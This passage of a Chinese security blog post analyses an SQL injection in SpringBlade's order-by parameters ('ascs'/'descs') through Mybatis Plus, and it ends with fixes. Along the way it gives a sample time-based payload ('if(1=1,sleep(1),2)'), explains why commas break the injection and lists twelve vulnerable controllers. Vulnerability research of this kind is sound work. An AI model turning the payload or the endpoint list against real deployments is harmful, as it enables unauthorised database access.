<span class="keyword">return</span> qw;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>知道了数据的传入，还有有一点需要弄明白，SQL语句的内容是从哪来的？</p>
+<p>很多人可能默认会想是根据<code>LogApiMapper.xml</code>中获取的，但其实并不是。其中的查询语句只有select部分，缺少from等元素，并且mysql日志的语句和下面语句中查询参数的顺序不一致。实际上SQL语句的构造并没有利用到Mapper配置中的该<code>&lt;sql&gt;</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 通用查询结果列 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">"baseColumnList"</span>&gt;</span></span><br><span class="line">		select id,</span><br><span class="line">		create_time AS createTime,</span><br><span class="line">		service_id, server_host, server_ip, env, type, title, method, request_uri, user_agent, remote_ip, method_class, method_name, params, time, create_by</span><br><span class="line"><span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>我们先来看看<code>IService</code>的声明，使用了<code>&lt;T&gt;</code>泛型</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IService</span>&lt;<span class="title">T</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>ILogApiService</code>继承<code>IService</code>时制定了<code>&lt;LogApi&gt;</code>作为数据类型，其实SQL语句的内容就是通过这个<code>LogApi</code>来构造的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ILogApiService</span> <span class="keyword">extends</span> <span class="title">IService</span>&lt;<span class="title">LogApi</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>来看<a href="https://github.com/chillzhuang/blade-tool/blob/master/blade-core-log/src/main/java/org/springblade/core/log/model/LogApi.java" target="_blank" rel="noopener">LogApi</a>的源码，里面定义了一些数据类型，继承<code>LogAbstract</code>，在注解<code>@TableName</code>中声明了数据库。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName</span>(<span class="string">"blade_log_api"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogApi</span> <span class="keyword">extends</span> <span class="title">LogAbstract</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">	<span class="keyword">private</span> String type;  <span class="comment">// 日志类型</span></span><br><span class="line">	<span class="keyword">private</span> String title;  <span class="comment">// 日志标题</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>LogApi又继承自<a href="https://github.com/chillzhuang/blade-tool/blob/master/blade-core-log/src/main/java/org/springblade/core/log/model/LogAbstract.java" target="_blank" rel="noopener">LogAbstract</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LogAbstract</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@TableId</span>(value = <span class="string">"id"</span>, type = IdType.ID_WORKER)</span><br><span class="line">	<span class="keyword">protected</span> Long id;  <span class="comment">// 主键id</span></span><br><span class="line">	<span class="keyword">protected</span> String serviceId;  <span class="comment">// 服务ID</span></span><br><span class="line">	<span class="keyword">protected</span> String serverIp;  <span class="comment">// 服务器 ip</span></span><br><span class="line">	<span class="keyword">protected</span> String serverHost;  <span class="comment">// 服务器名</span></span><br><span class="line">	<span class="keyword">protected</span> String env;  <span class="comment">// 环境</span></span><br><span class="line">	<span class="keyword">protected</span> String remoteIp;  <span class="comment">// 操作IP地址</span></span><br><span class="line">	<span class="keyword">protected</span> String userAgent;  <span class="comment">//用户代理</span></span><br><span class="line">	<span class="keyword">protected</span> String requestUri;  <span class="comment">//请求URI</span></span><br><span class="line">	<span class="keyword">protected</span> String method;  <span class="comment">// 操作方式</span></span><br><span class="line">	<span class="keyword">protected</span> String methodClass;  <span class="comment">// 方法类</span></span><br><span class="line">	<span class="keyword">protected</span> String methodName;  <span class="comment">// 方法名</span></span><br><span class="line">	<span class="keyword">protected</span> String params;  <span class="comment">// 操作提交的数据</span></span><br><span class="line">	<span class="keyword">protected</span> String time;  <span class="comment">// 执行时间</span></span><br><span class="line">	<span class="keyword">protected</span> String createBy;  <span class="comment">// 创建人</span></span><br><span class="line"></span><br><span class="line">	<span class="meta">@DateTimeFormat</span>(pattern = DateUtil.PATTERN_DATETIME)</span><br><span class="line">	<span class="meta">@JsonFormat</span>(pattern = DateUtil.PATTERN_DATETIME)</span><br><span class="line">	<span class="keyword">protected</span> Date createTime;  <span class="comment">// 创建时间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到以上数据就能明白，SQL是如何构造出来的。<code>select</code>部分是<code>LogApi</code>中的属性，<code>from</code>部分是通过注解<code>@TableName</code>获取的。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">type</span>, title, service_id, server_ip, server_host, env, remote_ip, user_agent, request_uri, method, method_class, method_name, params, <span class="built_in">time</span>, create_by, create_time </span><br><span class="line"><span class="keyword">FROM</span> blade_log_api</span><br></pre></td></tr></table></figure>
+
+<p>初步构造好SQL语句之后，通过<code>page</code>和<code>queryWrapper</code>获取到其他需要的值，构造出<code>order by</code>后的内容</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ORDER BY ascs ASC, create_time DESC LIMIT current*size,size</span><br></pre></td></tr></table></figure>
+
+<p>当<code>ascs</code>或<code>descs</code>中有逗号时，Mybatis Plus会以逗号为分隔符，分成多段，并在后面添加<code>ASC</code>。</p>
+<p>比如传入<code>ascs=if(1=1,sleep(1),2)</code>时，构造出来的语句为<code>ORDER BY if(1=1 ASC, sleep(1) ASC, 2) ASC</code></p>
+<p>所以在注入时不能使用逗号，否则会导致SQL语句出错。</p>
+<br>
+
+<p>除此之外，其他使用<code>Query</code>传入数据，进行<code>page</code>分页查询的功能，若未对<code>ascs</code>或<code>descs</code>覆盖用户传参，就存在同类型的SQL注入。</p>
+<p>以下代码中用到了分页查询：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">blade-service&#x2F;blade-log&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springblade&#x2F;core&#x2F;log&#x2F;controller&#x2F;LogErrorController.java</span><br><span class="line">blade-service&#x2F;blade-log&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springblade&#x2F;core&#x2F;log&#x2F;controller&#x2F;LogUsualController.java</span><br><span class="line">blade-service&#x2F;blade-demo&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;example&#x2F;demo&#x2F;controller&#x2F;NoticeController.java</span><br><span class="line">blade-service&#x2F;blade-desk&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springblade&#x2F;desk&#x2F;controller&#x2F;NoticeController.java</span><br><span class="line">blade-service&#x2F;blade-system&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springblade&#x2F;system&#x2F;controller&#x2F;AuthClientController.java</span><br><span class="line">blade-service&#x2F;blade-system&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springblade&#x2F;system&#x2F;controller&#x2F;ParamController.java</span><br><span class="line">blade-service&#x2F;blade-system&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springblade&#x2F;system&#x2F;controller&#x2F;PostController.java</span><br><span class="line">blade-service&#x2F;blade-system&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springblade&#x2F;system&#x2F;controller&#x2F;RegionController.java</span><br><span class="line">blade-service&#x2F;blade-system&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springblade&#x2F;system&#x2F;controller&#x2F;TenantController.java</span><br><span class="line">blade-service&#x2F;blade-user&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springblade&#x2F;system&#x2F;user&#x2F;controller&#x2F;UserController.java</span><br><span class="line">blade-ops&#x2F;blade-develop&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springblade&#x2F;develop&#x2F;controller&#x2F;CodeController.java</span><br><span class="line">blade-ops&#x2F;blade-develop&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;springblade&#x2F;develop&#x2F;controller&#x2F;DatasourceController.java</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h1><p>单点修复：当业务功能不需要<code>ascs</code>参数时，将<code>ascs</code>设置为空值，避免被用户传入。</p>
+<p>⚠️：order by后面是无法进行预编译的，并且由于使用Mybatis Plus，若想自己独立修改SQL语义成本较大。控制<code>ascs</code>的值是一个非常简洁的解决办法。</p>
+<p>若想要通用防护手段，需要将<code>SqlKeyword.filter()</code>的过滤方法加以改进。</p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <!--<a data-url="http://s31k31.github.io/2020/08/01/SpringBlade_SQLi/" data-id="ckdb9kkth000e99jkf8m2h0ml" class="article-share-link">
+                                            分享
+                                        </a> -->
+                                        
+                                    </footer>
+
+    </div>
+
+    
+        
+  <nav class="article-nav">
+    
+    
+      <a href="/2020/07/18/Java-Runtime.getRuntime.exec/" class="article-nav-link">
+        <strong class="article-nav-caption">后一篇</strong>
+        <div class="article-nav-title">Java Runtime.getRuntime().exec()碰到的问题</div>
+      </a>
+    
+  </nav>
+
+
+            
+
+                
+                    
+                        
+                            
+
+</article>
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <ul class="list-inline">
+      <li>&copy; 2020 Seikei&#39;s Blog</li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/seikei.jpg" alt="Seikei&#39;s Blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://github.com/s31k31" target="_blank" rel="noopener">Github</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="mailto:s31k31@gmail.com">Email</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="搜索">
+        <i class="fe fe-search"></i>
+        搜索
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
